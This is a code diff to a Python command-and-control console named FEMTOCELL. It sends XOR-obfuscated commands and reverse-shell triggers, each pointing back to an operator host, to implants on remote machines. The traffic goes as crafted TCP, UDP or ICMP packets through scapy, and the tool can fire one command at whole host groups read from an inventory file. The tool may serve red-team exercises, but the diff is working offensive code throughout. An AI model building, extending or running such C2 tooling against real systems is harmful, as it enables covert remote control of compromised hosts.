@@ -31,39 +31,40 @@ show
 parsedConfig = {}
 
 baseparams = {
-    "mode":"",
+    "MODE":"",
+    "FILE":"",
 }
 
 cmdparams = {
-    "rhost": "",
-    "rport": 445,
-    "lhost": "",
-    "sport": 6006,
-    "command": "whoami",
-    "transport": "tcp"
+    "RHOST": "",
+    "RPORT": 445,
+    "LHOST": "",
+    "SPORT": 6006,
+    "COMMAND": "whoami",
+    "TRANSPORT": "TCP"
 }
 
 shellparams = {
-    "rhost": "",
-    "rport": 445,
-    "lhost": "",
-    "lport": 443,
-    "sport": 6006,
-    "transport": "tcp"
+    "RHOST": "",
+    "RPORT": 445,
+    "LHOST": "",
+    "LPORT": 443,
+    "SPORT": 6006,
+    "TRANSPORT": "TCP"
 }
 
 groupparams = {
-    "group": "",
-    "rhost": "",
-    "rport": 445,
-    "lhost": "",
-    "sport": 6006,
-    "command": "whoami",
-    "transport": "tcp"
+    "GROUP": "",
+    "RHOST": "",
+    "RPORT": 445,
+    "LHOST": "",
+    "SPORT": 6006,
+    "COMMAND": "whoami",
+    "TRANSPORT": "TCP"
 }
 
 def getGroup():
-    key = groupparams["group"]
+    key = groupparams["GROUP"]
     loi = []
 
     if parsedConfig[key] == 'hosts':
@@ -102,9 +103,19 @@ def importConfig(op_1):
             parsedConfig[x] = "children"
             parsedConfig[x+":children"] = list(configItems[x].get('children'))
 
+    baseparams["FILE"] = op_1
+    print(f"[+] Config {op_1} loaded.\n")
+
 
 def print_groups():
-    pass
+    key = groupparams["GROUP"]
+
+    if parsedConfig[key] == 'hosts':
+        print(parsedConfig[key+':hosts'])
+    elif parsedConfig[key] == 'children':
+        subgroups = parsedConfig[key+':children']
+        for item in subgroups:
+            print(item)
 
 
 def xor_encrypt(byte_msg, byte_key):
@@ -121,7 +132,7 @@ def print_help():
 
 def print_options(p):
     for item in p.keys():
-        if baseparams["mode"] == "group" and item == "rhost":
+        if baseparams["MODE"] == "GROUP" and item == "RHOST":
             continue
         print(f"\n{item}: {p[item]}")
     print()
@@ -143,25 +154,27 @@ def main():
         os.system("mkdir history")
 
     while(True):
-        user_in = prompt(u'femtocell ~ ',
+        user_in = prompt(u'FEMTOCELL // ',
                         history=FileHistory('history/main.history'),
                         auto_suggest=AutoSuggestFromHistory(),
                         ).split()
         # click.echo_via_pager(user_input)
 
         if(len(user_in) == 3):
-            user_cmd = user_in[0]
-            op_1 = user_in[1]
-            op_2 = user_in[2]
+            user_cmd = user_in[0].upper()
+            op_1 = user_in[1].upper()
+            op_2 = user_in[2].upper()
 
-            if(user_cmd == "set"):
+            if(user_cmd == "SET"):
                 baseparams[op_1] = op_2
-                if op_1 == "mode":
-                    if baseparams["mode"] == "shell" or baseparams["mode"] == "cmd" or baseparams["mode"] == "group":
+                if op_1 == "MODE":
+                    if baseparams["MODE"] == "SHELL" or baseparams["MODE"] == "CMD" or baseparams["MODE"] == "GROUP":
                         pass
                     else:
                         print("mode set incorrectly")
-                        baseparams["mode"] = ""
+                        baseparams["MODE"] = ""
+                        continue
+                    print(f"[*] Mode {op_2} set.\n")
         elif len(user_in) == 2:
             user_cmd = user_in[0]
             op_1 = user_in[1]
@@ -173,24 +186,24 @@ def main():
                     continue
 
         elif len(user_in) == 1:
-            user_cmd = user_in[0]
+            user_cmd = user_in[0].upper()
 
-            if user_cmd == "exit":
+            if user_cmd == "EXIT":
                 exit()
-            elif user_cmd == "help":
+            elif user_cmd == "HELP":
                 print_help()
-            elif user_cmd == "mode":
+            elif user_cmd == "OPTIONS":
                 print_options(baseparams)
-            elif user_cmd == "interact":
-                if baseparams["mode"] == "shell":
-                    interact(shellparams)
-                elif baseparams["mode"] == "cmd":
-                    interact(cmdparams)
-                elif baseparams["mode"] == "group":
+            elif user_cmd == "READY":
+                if baseparams["MODE"] == "SHELL":
+                    ready(shellparams)
+                elif baseparams["MODE"] == "CMD":
+                    ready(cmdparams)
+                elif baseparams["MODE"] == "GROUP":
                     if len(parsedConfig) == 0:
                         print('no config loaded')
                         continue     
-                    interact(groupparams)
+                    ready(groupparams)
                 else:
                     print("you must set mode")
                     print_options(baseparams)
@@ -200,46 +213,54 @@ def main():
             print_help()
 
 
-def interact(params):
+def ready(params):
     while True:
-        user_in = prompt(f'femtocell ({baseparams["mode"]}) ~ ',
+        user_in = prompt(f'FEMTOCELL // ({baseparams["MODE"]}) // ',
                         history=FileHistory('history/interact.history'),
                         auto_suggest=AutoSuggestFromHistory(),
                         ).split()
 
         if len(user_in) == 1:
-            user_cmd = user_in[0]
+            user_cmd = user_in[0].upper()
 
-            if user_cmd == "back" or user_cmd == "exit":
+            if user_cmd == "BACK" or user_cmd == "EXIT":
                 return
-            elif user_cmd == "options":
+            elif user_cmd == "OPTIONS":
                 print_options(params)
             
-            elif user_cmd == "execute":
-                if baseparams["mode"] == "cmd" and verify(cmdparams):
-                    plaintext = "FC-CM-{}\00".format(params["command"])
+            elif baseparams["MODE"] == "GROUP" and user_cmd == "groups":
+                print_groups()
+            
+            elif user_cmd == "EXECUTE":
+                if baseparams["MODE"] == "CMD" and verify(cmdparams):
+                    plaintext = "FC-CM-{}\00".format(params["COMMAND"])
                     execute(plaintext, cmdparams)
-                elif baseparams["mode"] == "shell" and verify(shellparams):
-                    plaintext = "FC-SH-{}\00".format(params["lhost"]) 
+                elif baseparams["MODE"] == "SHELL" and verify(shellparams):
+                    plaintext = "FC-SH-{}\00".format(params["LHOST"]) 
                     execute(plaintext, shellparams)
-                elif baseparams["mode"] == "group" and verify(groupparams):
-                    plaintext = "FC-CM-{}\00".format(params["command"])
+                elif baseparams["MODE"] == "GROUP" and verify(groupparams):
+                    plaintext = "FC-CM-{}\00".format(params["COMMAND"])
+                    if parsedConfig.get(groupparams.get("GROUP")) == "":
+                        print("group not valid")
+                        continue
                     groupList = getGroup()
                     for iplist in groupList:
                         for ip in iplist:
-                            groupparams["rhost"] = ip
+                            groupparams["RHOST"] = ip
                             execute(plaintext, groupparams)
                 else:
                     continue
             else:			
                 continue
         elif len(user_in) == 3:
-            user_cmd = user_in[0]
-            op_1 = user_in[1]
-            op_2 = user_in[2]
+            user_cmd = user_in[0].upper()
+            op_1 = user_in[1].upper()
+            op_2 = user_in[2].upper()
 
-            if user_cmd == "set":
+            if user_cmd == "SET":
                 if op_1 in params.keys():
+                    if op_1 == "COMMAND" or op_1 == "GROUP":
+                        op_2 = op_2.lower()
                     params[op_1] = op_2
                     print_options(params)
                 else:
@@ -253,22 +274,22 @@ def interact(params):
 def verify(params):
     passing = False
 
-    if params["transport"] == "tcp" or params["transport"] == "udp" or params["transport"] == "icmp":
+    if params["TRANSPORT"] == "TCP" or params["TRANSPORT"] == "UDP" or params["TRANSPORT"] == "ICMP":
         passing = True
     else:
         print('transport incorrect')
-        params["transport"] == "tcp"
+        params["TRANSPORT"] == "TCP"
 
-    if baseparams["mode"] != "group" and params["rhost"] == "": # blank or is invalid ip
-        print("rhost incorrect")
+    if baseparams["MODE"] != "GROUP" and params["RHOST"] == "": # blank or is invalid ip
+        print("RHOST incorrect")
         passing = False
 
-    if params["lhost"] == "": # blank or is invalid ip
-        print('lhost incorrect')
+    if params["LHOST"] == "": # blank or is invalid ip
+        print('LHOST incorrect')
         passing = False
 
-    if baseparams["mode"] == "group" and params["group"] == "":
-        print("group not set")
+    if baseparams["MODE"] == "GROUP" and params["GROUP"] == "":
+        print("GROUP not set")
         passing = False
 
     return passing
@@ -277,21 +298,21 @@ def verify(params):
 def execute(plaintext, params):
     encrypted = xor_encrypt(plaintext.encode(), 0x10)
 
-    if(params["transport"] == "udp"):
-        scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
-        scapy.UDP(sport=params["sport"], dport=params["rport"])/
+    if(params["TRANSPORT"] == "UDP"):
+        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
+        scapy.UDP(sport=params["SPORT"], dport=params["RPORT"])/
         encrypted, verbose=False)
-    elif(params["transport"] == "tcp"):
-        scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
-        scapy.TCP(sport=params["sport"], dport=params["rport"], flags="AP")/
+    elif(params["TRANSPORT"] == "TCP"):
+        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
+        scapy.TCP(sport=params["SPORT"], dport=params["RPORT"], flags="AP")/
         encrypted, verbose=False)
-    elif(params["transport"] == "icmp"):
-        scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
+    elif(params["TRANSPORT"] == "ICMP"):
+        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
         scapy.ICMP(code=1, type=8)/
         encrypted, verbose=False)
 
-    rhost = params["rhost"]
-    print(f"Sending {plaintext} to {rhost}\n")
+    RHOST = params["RHOST"]
+    print(f"Sending {plaintext} to {RHOST}\n")
 
 if(__name__ == "__main__"):
     main()
